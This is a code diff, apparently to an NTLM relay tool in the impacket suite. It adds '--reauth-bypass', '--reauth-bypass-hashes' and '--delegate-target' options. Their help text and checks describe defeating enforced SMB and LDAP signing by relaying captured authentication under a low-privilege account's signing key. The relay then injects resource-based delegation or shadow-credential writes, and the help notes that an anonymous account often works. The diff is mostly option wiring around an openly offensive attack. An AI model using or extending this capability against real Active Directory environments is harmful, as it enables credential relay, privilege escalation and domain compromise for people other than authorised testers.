@@ -196,7 +196,7 @@ def start_servers(options, threads):
         c.setOutputFile(options.output_file)
         c.setdumpHashes(options.dump_hashes)
         c.setDumpLSA(options.dump_lsa)
-        c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.no_validate_privs, options.escalate_user, options.add_computer, options.delegate_access, options.dump_laps, options.dump_gmsa, options.dump_adcs, options.sid, options.add_dns_record, options.dump_info_attr, options.dump_pre2k)
+        c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.no_validate_privs, options.escalate_user, options.add_computer, options.delegate_access, options.dump_laps, options.dump_gmsa, options.dump_adcs, options.sid, options.add_dns_record, options.dump_info_attr, options.dump_pre2k, delegatetarget=options.delegate_target)
         c.setRPCOptions(options.rpc_mode, options.rpc_use_smb, options.auth_smb, options.hashes_smb, options.rpc_smb_port, options.icpr_ca_name)
         c.setMSSQLOptions(options.query)
         c.setInteractive(options.interactive)
@@ -208,6 +208,7 @@ def start_servers(options, threads):
         c.setSMBRPCAttack(options.rpc_attack)
         c.setInterfaceIp(options.interface_ip)
         c.setExploitOptions(options.remove_mic, options.remove_target, options.remove_sign_seal)
+        c.setReauthBypassOptions(options.reauth_bypass, options.reauth_bypass_hashes)
         c.setWebDAVOptions(options.serve_image)
         c.setIsADCSAttack(options.adcs)
         c.setIsCESAttack(options.adcs_ces)
@@ -368,6 +369,15 @@ if __name__ == '__main__':
                             help='Dump LSA secrets in addition to SAM hashes')
     smboptions.add_argument('--enum-local-admins', action='store_true', required=False, help='If relayed user is not admin, attempt SAMR lookup to see who is (only works pre Win 10 Anniversary)')
     smboptions.add_argument('--rpc-attack', action='store', choices=[None, "TSCH", "ICPR"], required=False, default=None, help='Select the attack to perform over RPC over named pipes.')
+    smboptions.add_argument('--reauth-bypass', action='store', required=False, metavar='[domain/]username[:password]',
+                            help='Defeat enforced signing: open a session with this low-privilege account and relay '
+                                 'the captured authentication under its signing key. Against an SMB target this is a '
+                                 're-authentication (MS-SMB2 3.3.5.5.2); against an ldap:// target it injects one '
+                                 'write chosen with the usual LDAP attack options (--delegate-access, '
+                                 '--shadow-credentials), and a bare ":" (anonymous) often works there. Needs '
+                                 '-smb2support, and is fixed on hosts updated since September 2026')
+    smboptions.add_argument('--reauth-bypass-hashes', action='store', required=False, metavar='LMHASH:NTHASH',
+                            help='Hashes of the --reauth-bypass account, instead of its password')
     
     #RPC arguments
     rpcoptions = parser.add_argument_group("RPC client options")
@@ -409,6 +419,7 @@ if __name__ == '__main__':
     ldapoptions.add_argument('--no-validate-privs', action='store_false', required=False, help='Do not attempt to enumerate privileges, assume permissions are granted to escalate a user via ACL attacks')
     ldapoptions.add_argument('--escalate-user', action='store', required=False, help='Escalate privileges of this user instead of creating a new one')
     ldapoptions.add_argument('--delegate-access', action='store_true', required=False, help='Delegate access on relayed computer account to the specified account')
+    ldapoptions.add_argument('--delegate-target', action='store', metavar='account|DN', required=False, help='Object to write RBCD on (sAMAccountName, or a full DN for the signing bypass), instead of the relayed computer itself')
     ldapoptions.add_argument('--sid', action='store_true', required=False, help='Use a SID to delegate access rather than an account name')
     ldapoptions.add_argument('--dump-laps', action='store_true', required=False, help='Attempt to dump any LAPS passwords readable by the user')
     ldapoptions.add_argument('--dump-gmsa', action='store_true', required=False, help='Attempt to dump any gMSA passwords readable by the user')
@@ -497,6 +508,25 @@ if __name__ == '__main__':
 
     if options.https and options.certfile is None:
         parser.error('--https requires --certfile')
+
+    if options.reauth_bypass is None:
+        if options.reauth_bypass_hashes is not None:
+            parser.error('--reauth-bypass-hashes requires --reauth-bypass')
+    elif not options.smb2support:
+        parser.error('--reauth-bypass requires -smb2support')
+    elif options.remove_target:
+        parser.error('--reauth-bypass cannot be combined with -remove-target, which overwrites the session key')
+    elif options.target is not None and options.target.lower().startswith('ldap'):
+        # The LDAP bypass is single-shot: one write from the existing attack options, no -i / -socks
+        if options.socks or options.interactive:
+            parser.error('--reauth-bypass against an LDAP target is single-shot; -i and -socks are not supported '
+                         '(the SASL seal key becomes the victim\'s after the bind)')
+        if not (options.delegate_access or options.shadow_credentials):
+            parser.error('--reauth-bypass against an LDAP target needs one write attack: '
+                         '--delegate-access or --shadow-credentials')
+        if options.remove_mic or options.remove_sign_seal:
+            parser.error('--reauth-bypass against an LDAP target forwards the victim mechListMIC, which '
+                         '-remove-mic / -remove-sign-seal strip')
 
     if options.rpc_use_smb and not options.auth_smb:
        logging.error("Set -auth-smb to relay DCE/RPC to SMB pipes")
